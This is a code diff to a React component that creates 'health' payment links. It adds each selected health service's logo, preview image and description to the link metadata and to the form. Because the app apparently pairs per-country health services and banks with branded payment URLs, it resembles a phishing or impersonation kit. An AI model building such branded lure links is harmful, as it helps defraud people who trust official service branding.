@@ -8,6 +8,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { getHealthServicesByCountry } from "@/lib/healthServices";
+import { getHealthBranding } from "@/lib/healthLogos";
 import { getBanksByCountry } from "@/lib/banks";
 import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
 import { generatePaymentLink } from "@/utils/paymentLinks";
@@ -54,6 +55,11 @@ const CreateHealthLink = () => {
   const selectedServiceData = useMemo(() =>
     services.find(s => s.key === selectedService),
     [services, selectedService]
+  );
+
+  const serviceBranding = useMemo(() =>
+    selectedService ? getHealthBranding(selectedService) : null,
+    [selectedService]
   );
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -113,7 +119,8 @@ const CreateHealthLink = () => {
           payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
         },
         timestamp: new Date().toISOString(),
-        description: selectedServiceData?.description
+        imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
+        description: serviceBranding?.description || selectedServiceData?.description
       });
 
       setCreatedPaymentUrl(paymentUrl);
@@ -204,11 +211,25 @@ const CreateHealthLink = () => {
                 </Select>
               </div>
 
-              {/* Service Description */}
-              {selectedService && selectedServiceData && (
+              {/* Service Logo and Description */}
+              {selectedService && serviceBranding && selectedServiceData && (
                 <div className="p-3 rounded-lg border border-border bg-card/50">
-                  <h3 className="font-semibold text-sm mb-1">{selectedServiceData.name}</h3>
-                  <p className="text-xs text-muted-foreground">{selectedServiceData.description}</p>
+                  <div className="flex items-center gap-3 mb-2">
+                    {serviceBranding.logo && (
+                      <img
+                        src={serviceBranding.logo}
+                        alt={selectedServiceData.name}
+                        className="h-8 object-contain"
+                        onError={(e) => {
+                          e.currentTarget.style.display = 'none';
+                        }}
+                      />
+                    )}
+                    <div>
+                      <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
+                    </div>
+                  </div>
+                  <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
                 </div>
               )}
 
